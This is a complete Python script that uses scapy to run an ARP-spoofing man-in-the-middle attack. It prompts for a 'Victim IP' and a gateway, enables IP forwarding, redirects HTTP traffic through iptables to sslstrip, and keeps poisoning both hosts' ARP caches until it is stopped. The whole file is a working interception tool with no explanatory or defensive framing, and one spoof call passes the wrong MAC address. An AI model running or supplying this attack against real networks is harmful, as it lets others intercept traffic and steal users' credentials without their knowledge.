#!/usr/bin/env python
import scapy.all as scapy
import time
import sys
import os

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def show_gateway():
    print("")
    os.system("arp -a")
    print("")

def flush_ip_tables():
    os.system("iptables --flush")
    os.system("iptables --table nat --flush")
    os.system("iptables --delete-chain")
    os.system("iptables --table nat --delete-chain")
    os.system("iptables -P FORWARD ACCEPT")

show_gateway()
target_ip = raw_input("\033[1;32;40m [*] Victim IP: \033[1;m")
gateway_ip = raw_input("\033[1;32;40m [*] Enter Gateway IP: \033[1;m")
print("\033[1;m \n[*] Enabling IP Forwarding...\033[1;m\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
os.system("gnome-terminal -x sslstrip")


try:
    sent_packets_count = 0
    target_mac = get_mac(target_ip)

    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip,target_mac)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sents: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl+C... Resetting ARP table...\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\n[-] Flushing IP Table...\n")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    flush_ip_tables()
    print("\n[-] Done!\n")